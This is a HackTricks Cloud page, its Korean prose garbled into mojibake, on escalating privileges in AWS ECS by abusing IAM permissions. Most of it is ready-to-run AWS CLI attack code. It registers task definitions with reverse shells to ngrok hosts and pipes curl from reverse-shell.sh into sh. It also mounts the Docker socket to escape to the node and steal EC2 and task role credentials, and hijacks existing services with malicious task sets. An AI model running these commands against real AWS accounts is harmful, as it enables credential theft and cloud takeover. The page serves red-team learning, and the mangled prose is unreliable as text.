# AWS - ECS Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## ECS

ë” ë§ì€ **ECS ì •ë³´**ëŠ” ë‹¤ìŒì—ì„œ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="../aws-services/aws-ecs-enum.md" %}
[aws-ecs-enum.md](../aws-services/aws-ecs-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:RunTask`

ê³µê²©ìê°€ ECSì—ì„œ `iam:PassRole`, `ecs:RegisterTaskDefinition` ë° `ecs:RunTask` ê¶Œí•œì„ ì•…ìš©í•˜ë©´ **ë©”íƒ€ë°ì´í„° ìê²© ì¦ëª…ì„ íƒˆì·¨í•˜ëŠ” ì•…ì„± ì»¨í…Œì´ë„ˆ**ë¡œ **ìƒˆ ì‘ì—… ì •ì˜ë¥¼ ìƒì„±**í•˜ê³  **ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--requires-compatibilities "[\"FARGATE\"]" \
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"

# Run task definition
aws ecs run-task --task-definition iam_exfiltration \
--cluster arn:aws:ecs:eu-west-1:947247140022:cluster/API \
--launch-type FARGATE \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"subnet-e282f9b8\"]}}"

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1
```
**Potential Impact:** ë‹¤ë¥¸ ECS ì—­í• ë¡œ ì§ì ‘ì ì¸ privesc.

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:StartTask`

ì´ì „ ì˜ˆì œì™€ ë§ˆì°¬ê°€ì§€ë¡œ ê³µê²©ìê°€ **`iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:StartTask`** ê¶Œí•œì„ ë‚¨ìš©í•˜ì—¬ ECSì—ì„œ **ì•…ì„± ì»¨í…Œì´ë„ˆ**ê°€ í¬í•¨ëœ **ìƒˆë¡œìš´ ì‘ì—… ì •ì˜ë¥¼ ìƒì„±**í•˜ê³  **ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ê·¸ëŸ¬ë‚˜ ì´ ê²½ìš° ì•…ì„± ì‘ì—… ì •ì˜ë¥¼ ì‹¤í–‰í•  ì»¨í…Œì´ë„ˆ ì¸ìŠ¤í„´ìŠ¤ê°€ í•„ìš”í•©ë‹ˆë‹¤.
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"

aws ecs start-task --task-definition iam_exfiltration \
--container-instances <instance_id>

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1
```
**Potential Impact:** ECS ì—­í• ì— ëŒ€í•œ ì§ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹.

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, (`ecs:UpdateService|ecs:CreateService)`

ì´ì „ ì˜ˆì œì™€ ë§ˆì°¬ê°€ì§€ë¡œ ê³µê²©ìê°€ **`iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:UpdateService`** ë˜ëŠ” **`ecs:CreateService`** ê¶Œí•œì„ ECSì—ì„œ ì•…ìš©í•˜ë©´ **ì•…ì„± ì»¨í…Œì´ë„ˆ**ê°€ í¬í•¨ëœ **ìƒˆ ì‘ì—… ì •ì˜ë¥¼ ìƒì„±**í•˜ê³  **ìµœì†Œ 1ê°œì˜ ì‘ì—…ì´ ì‹¤í–‰ ì¤‘ì¸ ìƒˆ ì„œë¹„ìŠ¤ë¥¼ ìƒì„±í•˜ì—¬ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.**
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn  "$ECS_ROLE_ARN" \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--requires-compatibilities "[\"FARGATE\"]" \
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/8.tcp.ngrok.io/12378 0>&1\\\"\"]}]"

# Run the task creating a service
aws ecs create-service --service-name exfiltration \
--task-definition iam_exfiltration \
--desired-count 1 \
--cluster "$CLUSTER_ARN" \
--launch-type FARGATE \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"$SUBNET\"]}}"

# Run the task updating a service
aws ecs update-service --cluster <CLUSTER NAME> \
--service <SERVICE NAME> \
--task-definition <NEW TASK DEFINITION NAME>
```
**ì ì¬ì  ì˜í–¥:** ëª¨ë“  ECS ì—­í• ì— ëŒ€í•œ ì§ì ‘ì ì¸ ê¶Œí•œ ìƒìŠ¹.

### `iam:PassRole`, (`ecs:UpdateService|ecs:CreateService)`

ì‚¬ì‹¤, ì´ëŸ¬í•œ ê¶Œí•œë§Œìœ¼ë¡œë„ ì„ì˜ì˜ ì—­í• ì„ ê°€ì§„ ì»¨í…Œì´ë„ˆì—ì„œ ì„ì˜ì˜ ëª…ë ¹ì„ ì‹¤í–‰í•˜ê¸° ìœ„í•´ overridesë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
aws ecs run-task \
--task-definition "<task-name>" \
--overrides '{"taskRoleArn":"<role-arn>", "containerOverrides":[{"name":"<container-name-in-task>","command":["/bin/bash","-c","curl https://reverse-shell.sh/6.tcp.eu.ngrok.io:18499 | sh"]}]}' \
--cluster <cluster-name> \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"DISABLED\", \"subnets\":[\"<subnet-name>\"]}}"
```
{% endcode %}

**Potential Impact:** ëª¨ë“  ECS ì—­í• ì— ëŒ€í•œ ì§ì ‘ì ì¸ privesc.

### `ecs:RegisterTaskDefinition`, **`(ecs:RunTask|ecs:StartTask|ecs:UpdateService|ecs:CreateService)`**

ì´ ì‹œë‚˜ë¦¬ì˜¤ëŠ” ì´ì „ ê²ƒë“¤ê³¼ ë¹„ìŠ·í•˜ì§€ë§Œ **`iam:PassRole`** ê¶Œí•œì´ **ì—†ëŠ”** ê²½ìš°ì…ë‹ˆë‹¤.\
ì´ê²ƒì€ ì—¬ì „íˆ í¥ë¯¸ë¡œìš´ë°, ì—­í• ì´ ì—†ëŠ” ì„ì˜ì˜ ì»¨í…Œì´ë„ˆë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤ë©´, **ë…¸ë“œë¡œ íƒˆì¶œí•˜ê¸° ìœ„í•´ ê¶Œí•œì´ ìˆëŠ” ì»¨í…Œì´ë„ˆë¥¼ ì‹¤í–‰**í•˜ê³  **EC2 IAM ì—­í• **ê³¼ ë…¸ë“œì—ì„œ ì‹¤í–‰ ì¤‘ì¸ **ë‹¤ë¥¸ ECS ì»¨í…Œì´ë„ˆ ì—­í• **ì„ **í›”ì¹  ìˆ˜ ìˆê¸° ë•Œë¬¸ì…ë‹ˆë‹¤**.\
ì‹¬ì§€ì–´ **ë‹¤ë¥¸ ì‘ì—…ì„ EC2 ì¸ìŠ¤í„´ìŠ¤ ë‚´ì—ì„œ ì‹¤í–‰í•˜ë„ë¡ ê°•ì œ**í•˜ì—¬ ê·¸ë“¤ì˜ ìê²© ì¦ëª…ì„ í›”ì¹  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤ (ì´ëŠ” [**Privesc to node section**](aws-ecs-privesc.md#privesc-to-node)ì—ì„œ ë…¼ì˜ëœ ë°”ì™€ ê°™ìŠµë‹ˆë‹¤).

{% hint style="warning" %}
ì´ ê³µê²©ì€ **ECS í´ëŸ¬ìŠ¤í„°ê°€ EC2** ì¸ìŠ¤í„´ìŠ¤ë¥¼ ì‚¬ìš©í•˜ê³  Fargateë¥¼ ì‚¬ìš©í•˜ì§€ ì•ŠëŠ” ê²½ìš°ì—ë§Œ ê°€ëŠ¥í•©ë‹ˆë‹¤.
{% endhint %}
```bash
printf '[
{
"name":"exfil_creds",
"image":"python:latest",
"entryPoint":["sh", "-c"],
"command":["/bin/bash -c \\\"bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/12976 0>&1\\\""],
"mountPoints": [
{
"readOnly": false,
"containerPath": "/var/run/docker.sock",
"sourceVolume": "docker-socket"
}
]
}
]' > /tmp/task.json

printf '[
{
"name": "docker-socket",
"host": {
"sourcePath": "/var/run/docker.sock"
}
}
]' > /tmp/volumes.json


aws ecs register-task-definition --family iam_exfiltration \
--cpu 256 --memory 512 \
--requires-compatibilities '["EC2"]' \
--container-definitions file:///tmp/task.json \
--volumes file:///tmp/volumes.json


aws ecs run-task --task-definition iam_exfiltration \
--cluster arn:aws:ecs:us-east-1:947247140022:cluster/ecs-takeover-ecs_takeover_cgidc6fgpq6rpg-cluster \
--launch-type EC2

# You will need to do 'apt update' and 'apt install docker.io' to install docker in the rev shell
```
### `ecs:ExecuteCommand`, `ecs:DescribeTasks,`**`(ecs:RunTask|ecs:StartTask|ecs:UpdateService|ecs:CreateService)`**

**`ecs:ExecuteCommand`, `ecs:DescribeTasks`** ê¶Œí•œì„ ê°€ì§„ ê³µê²©ìëŠ” ì‹¤í–‰ ì¤‘ì¸ ì»¨í…Œì´ë„ˆ ë‚´ë¶€ì—ì„œ **ëª…ë ¹ì„ ì‹¤í–‰**í•˜ê³  í•´ë‹¹ ì»¨í…Œì´ë„ˆì— ì—°ê²°ëœ IAM ì—­í• ì„ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ëª…ë ¹ì„ ì‹¤í–‰í•˜ë ¤ë©´ `aws ecs execute-command`ë¥¼ ì‹¤í–‰í•´ì•¼ í•˜ë¯€ë¡œ describe ê¶Œí•œì´ í•„ìš”í•©ë‹ˆë‹¤).\
ê·¸ëŸ¬ë‚˜ ì´ë¥¼ ìœ„í•´ì„œëŠ” ì»¨í…Œì´ë„ˆ ì¸ìŠ¤í„´ìŠ¤ê°€ **ExecuteCommand ì—ì´ì „íŠ¸**ë¥¼ ì‹¤í–‰ ì¤‘ì´ì–´ì•¼ í•©ë‹ˆë‹¤ (ê¸°ë³¸ì ìœ¼ë¡œëŠ” ì‹¤í–‰ë˜ì§€ ì•ŠìŒ).

ë”°ë¼ì„œ ê³µê²©ìëŠ” ë‹¤ìŒì„ ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* ì‹¤í–‰ ì¤‘ì¸ ëª¨ë“  ì»¨í…Œì´ë„ˆì—ì„œ **ëª…ë ¹ ì‹¤í–‰ ì‹œë„**
```bash
# List enableExecuteCommand on each task
for cluster in $(aws ecs list-clusters | jq .clusterArns | grep '"' | cut -d '"' -f2); do
echo "Cluster $cluster"
for task in $(aws ecs list-tasks --cluster "$cluster" | jq .taskArns | grep '"' | cut -d '"' -f2); do
echo "  Task $task"
# If true, it's your lucky day
aws ecs describe-tasks --cluster "$cluster" --tasks "$task" | grep enableExecuteCommand
done
done

# Execute a shell in a container
aws ecs execute-command --interactive \
--command "sh" \
--cluster "$CLUSTER_ARN" \
--task "$TASK_ARN"
```
* ë§Œì•½ ê·¸ê°€ **`ecs:RunTask`** ê¶Œí•œì„ ê°€ì§€ê³  ìˆë‹¤ë©´, `aws ecs run-task --enable-execute-command [...]` ëª…ë ¹ì–´ë¡œ íƒœìŠ¤í¬ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤.
* ë§Œì•½ ê·¸ê°€ **`ecs:StartTask`** ê¶Œí•œì„ ê°€ì§€ê³  ìˆë‹¤ë©´, `aws ecs start-task --enable-execute-command [...]` ëª…ë ¹ì–´ë¡œ íƒœìŠ¤í¬ë¥¼ ì‹œì‘í•©ë‹ˆë‹¤.
* ë§Œì•½ ê·¸ê°€ **`ecs:CreateService`** ê¶Œí•œì„ ê°€ì§€ê³  ìˆë‹¤ë©´, `aws ecs create-service --enable-execute-command [...]` ëª…ë ¹ì–´ë¡œ ì„œë¹„ìŠ¤ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.
* ë§Œì•½ ê·¸ê°€ **`ecs:UpdateService`** ê¶Œí•œì„ ê°€ì§€ê³  ìˆë‹¤ë©´, `aws ecs update-service --enable-execute-command [...]` ëª…ë ¹ì–´ë¡œ ì„œë¹„ìŠ¤ë¥¼ ì—…ë°ì´íŠ¸í•©ë‹ˆë‹¤.

**ì´ ì˜µì…˜ë“¤ì˜ ì˜ˆì œ**ëŠ” **ì´ì „ ECS privesc ì„¹ì…˜**ì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ì ì¬ì  ì˜í–¥:** ì»¨í…Œì´ë„ˆì— ì—°ê²°ëœ ë‹¤ë¥¸ ì—­í• ë¡œ privesc.

### `ssm:StartSession`

ì´ ê¶Œí•œì„ **ECSë¡œ privesc**í•˜ê¸° ìœ„í•´ ì–´ë–»ê²Œ ì•…ìš©í•  ìˆ˜ ìˆëŠ”ì§€ **ssm privesc í˜ì´ì§€**ì—ì„œ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="aws-ssm-privesc.md" %}
[aws-ssm-privesc.md](aws-ssm-privesc.md)
{% endcontent-ref %}

### `iam:PassRole`, `ec2:RunInstances`

ì´ ê¶Œí•œë“¤ì„ **ECSë¡œ privesc**í•˜ê¸° ìœ„í•´ ì–´ë–»ê²Œ ì•…ìš©í•  ìˆ˜ ìˆëŠ”ì§€ **ec2 privesc í˜ì´ì§€**ì—ì„œ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="aws-ec2-privesc.md" %}
[aws-ec2-privesc.md](aws-ec2-privesc.md)
{% endcontent-ref %}

### `?ecs:RegisterContainerInstance`

TODO: ë‹¤ë¥¸ AWS ê³„ì •ì—ì„œ ì¸ìŠ¤í„´ìŠ¤ë¥¼ ë“±ë¡í•˜ì—¬ ê³µê²©ìê°€ ì œì–´í•˜ëŠ” ë¨¸ì‹ ì—ì„œ íƒœìŠ¤í¬ê°€ ì‹¤í–‰ë˜ë„ë¡ í•  ìˆ˜ ìˆëŠ”ì§€??

### `ecs:CreateTaskSet`, `ecs:UpdateServicePrimaryTaskSet`, `ecs:DescribeTaskSets`

{% hint style="info" %}
TODO: ì´ê²ƒì„ í…ŒìŠ¤íŠ¸í•˜ì„¸ìš”
{% endhint %}

`ecs:CreateTaskSet`, `ecs:UpdateServicePrimaryTaskSet`, `ecs:DescribeTaskSets` ê¶Œí•œì„ ê°€ì§„ ê³µê²©ìëŠ” **ê¸°ì¡´ ECS ì„œë¹„ìŠ¤ì— ëŒ€í•´ ì•…ì„± íƒœìŠ¤í¬ ì„¸íŠ¸ë¥¼ ìƒì„±í•˜ê³  ê¸°ë³¸ íƒœìŠ¤í¬ ì„¸íŠ¸ë¥¼ ì—…ë°ì´íŠ¸**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ ê³µê²©ìëŠ” **ì„œë¹„ìŠ¤ ë‚´ì—ì„œ ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
bashCopy code# Register a task definition with a reverse shell
echo '{
"family": "malicious-task",
"containerDefinitions": [
{
"name": "malicious-container",
"image": "alpine",
"command": [
"sh",
"-c",
"apk add --update curl && curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | sh"
]
}
]
}' > malicious-task-definition.json

aws ecs register-task-definition --cli-input-json file://malicious-task-definition.json

# Create a malicious task set for the existing service
aws ecs create-task-set --cluster existing-cluster --service existing-service --task-definition malicious-task --network-configuration "awsvpcConfiguration={subnets=[subnet-0e2b3f6c],securityGroups=[sg-0f9a6a76],assignPublicIp=ENABLED}"

# Update the primary task set for the service
aws ecs update-service-primary-task-set --cluster existing-cluster --service existing-service --primary-task-set arn:aws:ecs:region:123456789012:task-set/existing-cluster/existing-service/malicious-task-set-id
```
**ì ì¬ì  ì˜í–¥**: ì˜í–¥ì„ ë°›ëŠ” ì„œë¹„ìŠ¤ì—ì„œ ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•˜ì—¬ ê¸°ëŠ¥ì— ì˜í–¥ì„ ë¯¸ì¹˜ê±°ë‚˜ ë¯¼ê°í•œ ë°ì´í„°ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## ì°¸ê³  ìë£Œ

* [https://ruse.tech/blogs/ecs-attack-methods](https://ruse.tech/blogs/ecs-attack-methods)

{% hint style="success" %}
AWS í•´í‚¹ í•™ìŠµ ë° ì—°ìŠµ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP í•´í‚¹ í•™ìŠµ ë° ì—°ìŠµ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›</summary>

* [**êµ¬ë… í”Œëœ**](https://github.com/sponsors/carlospolop)ì„ í™•ì¸í•˜ì„¸ìš”!
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**telegram ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ì„ íŒ”ë¡œìš°í•˜ì„¸ìš”.
* PRì„ ì œì¶œí•˜ì—¬ [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
{% endhint %}
